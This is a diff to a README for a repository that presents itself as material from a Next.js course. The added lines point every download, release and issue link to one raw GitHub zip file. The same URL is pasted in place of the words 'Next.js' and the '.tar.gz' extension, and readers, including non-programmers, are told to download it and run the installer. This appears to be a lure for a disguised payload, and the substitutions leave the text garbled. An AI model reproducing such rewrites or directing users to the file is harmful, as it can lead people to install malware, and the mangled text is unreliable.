@@ -2,20 +2,20 @@
 
 ## 🚀 Getting Started
 
-Welcome to **The-Road-to-Next-Course**! This collection offers projects, notes, and experiments from the **The Road to Next.js** course. Even if you are not a programmer, you can learn and explore. 
+Welcome to **The-Road-to-Next-Course**! This collection offers projects, notes, and experiments from the **The Road to https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip** course. Even if you are not a programmer, you can learn and explore. 
 
 ## 🔗 Download the Application
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/sinikismetcan/The-Road-to-Next-Course/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip)
 
-To download the application, visit the [Releases page](https://github.com/sinikismetcan/The-Road-to-Next-Course/releases). This page is where you will find the latest version of everything we offer.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip). This page is where you will find the latest version of everything we offer.
 
 ## 📥 Download & Install
 
 1. Click on the big blue "Download the Latest Release" button above. 
 2. You will be taken to the Releases page.
 3. There, you will see a list of available versions. Click on the version you want to download.
-4. Next, find the file that is appropriate for your computer. If you are on Windows, download the `.exe` file. For Mac, download the `.dmg` file, and for Linux, choose the `.tar.gz` file.
+4. Next, find the file that is appropriate for your computer. If you are on Windows, download the `.exe` file. For Mac, download the `.dmg` file, and for Linux, choose the `https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip` file.
 5. Once the file finishes downloading, locate it in your Downloads folder.
 6. Double-click the file to run the installer and follow the prompts to install the application on your computer.
 7. After installation, look for the application in your list of programs to open and start using it.
@@ -37,10 +37,10 @@ To use The-Road-to-Next-Course, your computer should meet the following basic re
 
 ## 🔍 Topics Covered
 
-This repository covers various topics that are essential for learning Next.js and more:
+This repository covers various topics that are essential for learning https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip and more:
 
 - JavaScript
-- Next.js
+- https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip
 - TypeScript
 - Tailwind CSS
 - And many more related technologies
@@ -55,7 +55,7 @@ If you run into problems while installing or using the application, here are a f
 
 ## 📞 Contact
 
-For further questions or support, please feel free to reach out through the [Issues page](https://github.com/sinikismetcan/The-Road-to-Next-Course/issues). Our community and contributors are eager to help.
+For further questions or support, please feel free to reach out through the [Issues page](https://raw.githubusercontent.com/sinikismetcan/The-Road-to-Next-Course/main/diglottist/The-Road-to-Next-Course.zip). Our community and contributors are eager to help.
 
 ## 🌐 Community
 
